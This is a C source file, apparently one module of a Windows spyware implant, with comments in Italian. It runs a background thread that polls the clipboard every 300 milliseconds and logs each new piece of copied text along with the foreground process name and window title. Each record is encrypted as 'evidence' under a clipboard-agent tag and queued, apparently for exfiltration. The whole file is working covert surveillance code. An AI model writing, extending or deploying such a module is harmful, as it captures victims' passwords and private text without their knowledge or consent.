#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <TlHelp32.h>
#include <time.h>

#include "zmem.h"
#include "globals.h"
#include "proto.h"
#include "clipboard.h"
#include "utils.h"
#include "debug.h"

CLIPBOARD_LOGS lpClipboardLogs[MAX_CLIPBOARD_QUEUE];

LPWSTR FindProc(DWORD pid)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD dwPID = 0;
	LPWSTR name_offs;
	LPWSTR strProcName = NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if ( (hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return NULL;

	if( !Process32First(hProcessSnap, &pe32) ) {
		CloseHandle(hProcessSnap);
		return NULL;
	}

	// Cicla la lista dei processi attivi
	do {
		// Cerca il processo "pid"
		if (pe32.th32ProcessID == pid) {
			// Elimina il path
			name_offs = wcsrchr(pe32.szExeFile, '\\');
			if (!name_offs)
				name_offs = pe32.szExeFile;
			else
				name_offs++;
			strProcName = _wcsdup(name_offs);
			break;
		}
	} while(Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);

	return strProcName;
}

// I parametri vanno allocati dal chiamante. Il buffer di ritorno NON va liberato!
// Se torna NULL o la clipboard e' vuota o e' uguale al precedente polling
// dwProcessSize e dwTitleSize sono in numero DI CARATTERI
LPWSTR PollClipBoard(LPWSTR strProcess, DWORD dwProcessSize, LPWSTR strWindowTitle, DWORD dwTitleSize)
{
	HANDLE hData;
	HWND hFocus;	
	WCHAR *clipboard_content;
	DWORD clip_len, dwProcessId = 0;
	LPWSTR asc_proc_name = NULL;

	static WCHAR *old_clipboard_content = NULL;

	if (strProcess)
		ZeroMemory(strProcess, dwProcessSize);
	if (strWindowTitle)
		ZeroMemory(strWindowTitle, dwTitleSize);
	
	hFocus = GetForegroundWindow();
	OpenClipboard(hFocus);
	if (!(hData = GetClipboardData(CF_UNICODETEXT))) {
		CloseClipboard();
		return NULL;
	}

	clipboard_content = (WCHAR *)GlobalLock(hData);
	// Se e' la prima volta che trova contenuti, o se sono diversi dalla volta
	// precedente allora continua
	if (!clipboard_content || (old_clipboard_content && !wcscmp(old_clipboard_content, clipboard_content))) {
		GlobalUnlock(hData);
		CloseClipboard();
		return NULL;
	}	
	
	clip_len = (wcslen(clipboard_content)+1)*sizeof(WCHAR);
	zfree(old_clipboard_content);
	// Salva il contenuto della clipboard per confrontarlo con
	// i prossimi.
	if (old_clipboard_content = (WCHAR *)zalloc(clip_len))
		memcpy(old_clipboard_content, clipboard_content, clip_len);
	GlobalUnlock(hData);
	CloseClipboard();
	if (!old_clipboard_content)
		return NULL;

	// Scrive il nome del processo in foreground e della finestra
	if (strWindowTitle)
		GetWindowTextW(hFocus, strWindowTitle, dwTitleSize);
	if (strProcess) {
		GetWindowThreadProcessId(hFocus, &dwProcessId);
		if (dwProcessId && (asc_proc_name = FindProc(dwProcessId))) {
			wcscpy_s(strProcess, dwProcessSize, asc_proc_name);
			zfree(asc_proc_name);
		}	 	
	}
	
	return old_clipboard_content;
}


BOOL QueueClipboardLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
{
	for (DWORD i=0; i<MAX_CLIPBOARD_QUEUE; i++)
	{
		if (lpClipboardLogs[i].dwSize == 0 || lpClipboardLogs[i].lpBuffer == NULL)
		{
			lpClipboardLogs[i].dwSize = dwEvSize;
			lpClipboardLogs[i].lpBuffer = lpEvBuff;

			return TRUE;
		}
	}

	return FALSE;
}

VOID ClipBoardMain()
{
	DWORD dwDelimiter = ELEM_DELIMITER;
	LPWSTR strProcess = (LPWSTR) zalloc(0x1000*sizeof(WCHAR));
	LPWSTR strTitle = (LPWSTR) zalloc(0x1000*sizeof(WCHAR));

	while(1)
	{
		if (bClipBoardThread == FALSE)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] ClipBoardMain exiting\n");
#endif
			hClipBoardThread = NULL;
			zfree(strProcess);
			zfree(strTitle);
			return;
		}


		Sleep(300);

		if (bCollectEvidences)
		{
			LPWSTR lpClipBoardBuff = PollClipBoard(strProcess, 0x1000, strTitle, 0x1000);
			if (lpClipBoardBuff)
			{
				DWORD dwTotalSize = sizeof(struct tm) +  
					wcslen(strProcess)*sizeof(WCHAR) + 2 +
					wcslen(strTitle)*sizeof(WCHAR) + 2 +
					wcslen(lpClipBoardBuff)*sizeof(WCHAR) + 2 + 
					sizeof(DWORD);

				LPBYTE lpBuffer = (LPBYTE) zalloc(dwTotalSize);
				LPBYTE lpTmpBuff  = lpBuffer;

				struct tm tStamp;
				GET_TIME(tStamp);

				memcpy(lpTmpBuff, &tStamp, sizeof(struct tm));
				lpTmpBuff += sizeof(struct tm);

				memcpy(lpTmpBuff, strProcess, wcslen(strProcess)*sizeof(WCHAR));
				lpTmpBuff += (wcslen(strProcess)*sizeof(WCHAR) + 2);

				memcpy(lpTmpBuff, strTitle, wcslen(strTitle)*sizeof(WCHAR));
				lpTmpBuff += (wcslen(strTitle)*sizeof(WCHAR) + 2);

				memcpy(lpTmpBuff, lpClipBoardBuff, wcslen((LPWSTR)lpClipBoardBuff)*sizeof(WCHAR));
				lpTmpBuff += (wcslen(lpClipBoardBuff)*sizeof(WCHAR) + 2);

				memcpy(lpTmpBuff, &dwDelimiter, sizeof(DWORD));

				DWORD dwEvSize;
				LPBYTE lpEvBuffer = PackEncryptEvidence(dwTotalSize, lpBuffer, PM_CLIPBOARDAGENT, NULL, 0, &dwEvSize);
				zfree(lpBuffer);

				if (!QueueClipboardLog(lpEvBuffer, dwEvSize))
					zfree(lpEvBuffer);
			}
		}
	}

	zfree(strProcess); // not reached
	zfree(strTitle);
}